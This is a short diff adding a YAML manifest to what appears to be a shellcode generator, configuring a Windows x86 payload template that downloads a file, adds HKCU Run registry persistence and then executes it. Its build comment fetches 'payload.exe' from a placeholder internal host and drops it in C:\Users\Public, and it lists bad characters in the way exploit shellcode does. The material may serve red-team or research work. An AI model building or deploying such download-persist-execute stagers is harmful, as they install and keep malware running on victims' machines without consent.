@@ -1,0 +1,10 @@
+# Download + registry persistence + execute
+# IR workflow: URLDownloadToFileA -> RegOpenKeyExA + RegSetValueExA (HKCU Run) -> WinExec
+# Downloads a file, writes HKCU\...\Run persistence, then executes.
+#
+# Build:
+#   uv run emitrion emitrion/manifests/win-x86/download_persist.yaml \
+#       --url "http://192.168.1.100/payload.exe" \
+#       --dst "C:\Users\Public\payload.exe" --no-assemble --out emitter_out/
+template: ir_download_persist
+badchars: ["00", "0A", "0D"]
